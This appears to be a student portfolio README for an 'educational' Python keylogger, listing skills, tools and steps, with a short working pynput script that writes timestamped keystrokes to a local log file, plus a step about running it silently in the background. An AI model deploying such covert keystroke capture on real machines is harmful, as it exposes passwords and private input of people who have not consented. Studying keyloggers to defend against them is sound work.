# Keylogger Project

## Objective

This project involves building a Python-based keylogger to record keyboard inputs for educational purposes and demonstrate ethical hacking techniques. The goal is to understand how keyloggers operate, learn the principles of monitoring input devices, and emphasize the importance of securing systems against such threats.

> **Note:** This project is strictly for educational use and ethical learning.

---

## Skills Learned

- Proficiency in Python programming for interacting with operating system APIs.
- Understanding of keylogging mechanisms and input capture techniques.
- Hands-on experience with libraries like `pynput` for monitoring keyboard inputs.
- Knowledge of secure data handling and logging practices.
- Awareness of ethical hacking principles and system protection strategies.

---

## Tools Used

- **Python 3** for development.
- Libraries:
  - `pynput` for capturing keyboard inputs.
  - `logging` for structured logging.
  - `os` for directory management.
- **Virtual Machine** (e.g., VirtualBox) for safe testing.

---

## Steps

1. **Set Up the Environment:**
   - Installed Python 3 and the `pynput` library.
   - Configured the environment for secure logging and file management.

2. **Capture Keyboard Inputs:**
   - Used the `pynput` library to monitor and record keyboard inputs.
   - Ensured the logs were stored securely in a designated directory.

3. **Implement Structured Logging:**
   - Utilized the `logging` library to format and store captured keystrokes.
   - Designed log files with timestamps for traceability.

4. **Set Up Logging Directory:**
   - Created a specific directory (`C:\Users\HP\OneDrive\Documents\cisco`) for storing log files.
   - Ensured proper permissions and access control for the directory.

5. **Implement Background Functionality:**
   - Set up the keylogger to run silently in the background without user interruption.

6. **Test and Debug:**
   - Tested the keylogger in a secure virtual machine to validate input capture and log storage.
   - Debugged any issues with logging and file management.

7. **Document Ethical Usage:**
   - Emphasized the ethical guidelines and educational purpose of the project.

---

## Example Code

Here’s the implementation:

```python
from pynput.keyboard import Key, Listener
import logging

# Directory where the log file will be saved
log_dir = r"C:\Users\HP\OneDrive\Documents\cisco"

# Set up logging
logging.basicConfig(
    filename=log_dir + r"\keylog.txt", 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

# Function to be called when a key is pressed
def on_press(key):
    try:
        # Log the key pressed
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error: {e}")

# Set up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
